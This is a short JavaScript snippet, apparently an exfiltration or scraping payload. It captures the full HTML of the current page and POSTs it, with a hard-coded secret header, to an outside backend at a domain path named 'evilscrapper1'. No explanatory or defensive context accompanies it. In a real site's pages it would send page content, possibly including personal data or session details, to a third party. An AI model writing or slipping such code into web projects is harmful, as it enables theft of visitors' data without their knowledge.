const html = document.documentElement.innerHTML;

fetch("https://undergr0und.com/evilscrapper1/backend/api/process_html.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-SECRET": "D8f3Y!vN72$e9KpCqR0t^J6Lu@AqTzZbX1M#PwLfUo4E",
  },
  body: JSON.stringify({ html }),
})
  .then((res) => res.json())
  .then((data) => console.log("✅ Backend result:", data))
  .catch((err) => console.error("❌ Error:", err));
